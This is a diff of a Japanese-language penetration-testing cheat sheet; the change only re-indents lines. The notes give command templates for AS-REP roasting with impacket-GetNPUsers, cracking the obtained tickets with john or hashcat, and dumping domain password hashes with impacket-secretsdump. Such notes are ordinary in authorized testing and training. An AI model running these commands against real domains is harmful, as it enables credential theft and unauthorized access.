@@ -26,10 +26,10 @@
 - [impacket](https://github.com/fortra/impacket) (Kali〇, python)  
   `impacket-〇〇`以外に、`python3 /usr/share/doc/python3-impacket/examples/〇〇.py`でも実行できる
   - GetNPUsers  
-   「`impacket-GetNPUsers` -no-pass -dc-ip ドメコンIP ドメイン名/ユーザ名 -outputfile 出力ファイル名」  
-   で`ASREPRoast`（Kerberos事前認証を必要としていないユーザのTGTチケットを取得できる）を実行  
-   取得したTGTチケットを「john --wordlist=Wordlist名 Ticketファイル」または「hashcat -a 0 -m 18200 」でクラックできる  
-　 「`impacket-GetNPUsers -no-pass -dc-ip ドメコンIP -userfile ユーザリスト ドメイン名/ -outputfile 出力ファイル名`」では「-userfile」内の各ユーザがASREPRoastできるかどうか確認できる
+    「`impacket-GetNPUsers` -no-pass -dc-ip ドメコンIP ドメイン名/ユーザ名 -outputfile 出力ファイル名」  
+    で`ASREPRoast`（Kerberos事前認証を必要としていないユーザのTGTチケットを取得できる）を実行  
+    取得したTGTチケットを「john --wordlist=Wordlist名 Ticketファイル」または「hashcat -a 0 -m 18200 」でクラックできる
+　  「`impacket-GetNPUsers -no-pass -dc-ip ドメコンIP -userfile ユーザリスト ドメイン名/ -outputfile 出力ファイル名`」では「-userfile」内の各ユーザがASREPRoastできるかどうか確認できる
   - secretsdump  
     「`impacket-secretsdump` -just-dc ドメイン名/ユーザ名:パスワード@IPアドレス」  
     でドメインユーザのパスワードハッシュをダンプできる。
